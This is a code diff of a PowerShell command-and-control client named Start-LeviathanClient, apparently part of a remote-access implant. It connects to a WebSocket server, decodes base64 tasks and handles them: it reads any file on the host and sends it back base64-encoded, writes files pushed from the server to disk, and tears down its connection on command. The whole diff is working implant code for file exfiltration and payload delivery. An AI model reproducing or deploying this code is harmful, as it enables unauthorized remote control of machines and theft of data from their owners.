@@ -32,7 +32,7 @@ function Start-LeviathanClient {
 
     #Register all the events we need to send and receive data from the server 
     Write-Verbose "[+] Registering events for the client"
-    $null = Register-ObjectEvent -InputObject $client -EventName DataReceived -Action {New-Event -SourceIdentifier 'TaskReceived' -MessageData $($event.sourceEventArgs.Data)}
+    $null = Register-ObjectEvent -InputObject $client -EventName MessageReceived -Action {New-Event -SourceIdentifier 'TaskReceived' -MessageData $($event.sourceEventArgs.Message)}
     $null = Register-ObjectEvent -InputObject $client -EventName Closed -Action {New-Event -SourceIdentifier 'ConnectionClosed' -MessageData $true}
 
     Write-Verbose "[+] Attempting to connect to server"
@@ -53,8 +53,8 @@ function Start-LeviathanClient {
     Write-Verbose "[+] Waiting for tasking"
 
     while ($client.State -ne [WebSocket4Net.WebSocketState]::Closed) {
-        $rawTask = (Wait-Event -SourceIdentifier 'TaskReceived').MessageData
-        
+        $encTask = (Wait-Event -SourceIdentifier 'TaskReceived').MessageData
+        $rawTask = [Convert]::FromBase64String($encTask)
         #Get the task ID
         $TaskID = $rawTask[0]
         Write-Verbose "[+] Received Task from server $taskID"
@@ -86,28 +86,40 @@ function Start-LeviathanClient {
                 $ResultData += [BitConverter]::GetBytes(0) + [Text.Encoding]::ASCII.GetBytes("|$result") 
             }
             #Download File
-            1 { 
-                $filePath = [Text.Encoding]::ASCII.GetString($rawTask[2..$rawTask.Length])
-                $fileName = Split-Path -Path $filePath -Leaf
-                $fileData = Get-Content -Path $filePath -Encoding Byte
-                $fileData = [Convert]::ToBase64String($fileData)
-                $ResultData += [BitConverter]::GetBytes(1) + [Text.Encoding]::ASCII.GetBytes("|$fileData") + [Text.Encoding]::ASCII.GetBytes("|$fileName")
+            1 {
+                try {
+                    Write-Verbose "Received Download task"
+                    $filePath = [Text.Encoding]::ASCII.GetString($rawTask[2..$rawTask.Length])
+                    $filePath = (Resolve-Path -Path $filePath).Path
+                    $fileName = Split-Path -Path $filePath -Leaf
+                    Write-Verbose "uploading file $filePath"
+                    $fileData = Get-Content -Path $filePath -Encoding Byte
+                    $fileData = [Convert]::ToBase64String($fileData)
+                    $ResultData += [BitConverter]::GetBytes(1) + [Text.Encoding]::ASCII.GetBytes("|$fileData|$fileName")
+                }
+                catch {
+                    $ResultData += [BitConverter]::GetBytes(4) + [Text.Encoding]::ASCII.GetBytes("|$_")
+                }
             }
             #File upload
             2 {
                 try {
+                    Write-Verbose "Received upload task"
                     $dataString = [Text.Encoding]::ASCII.GetString($rawTask[2..$rawTask.Length])
                     $encData = $dataString.split('|')[0]
                     $fileName = $dataString.split('|')[1]
+                    Write-Verbose "Downloading file from server"
                     Set-Content -Path $fileName -Value $([Convert]::FromBase64String($encData)) -Encoding Byte
-                    $ResultData += [Text.Encoding]::ASCII.GetBytes("File upload successful")
+                    $ResultData += [BitConverter]::GetBytes(2) + [Text.Encoding]::ASCII.GetBytes("|File upload successful")
                 }
                 catch {
-                    $ResultData += [Text.Encoding]::ASCII.GetBytes("File upload failed")
+                    $ResultData += [BitConverter]::GetBytes(2) + [Text.Encoding]::ASCII.GetBytes("|$_")
                 }
             }
             3 {
-                exit
+                Get-Event -SourceIdentifier "TaskReceived" | Remove-Event
+                Get-EventSubscriber | Unregister-Event
+                $script:client.close()
             }
             Default {$ResultData += [BitConverter]::GetBytes(4)}
         }
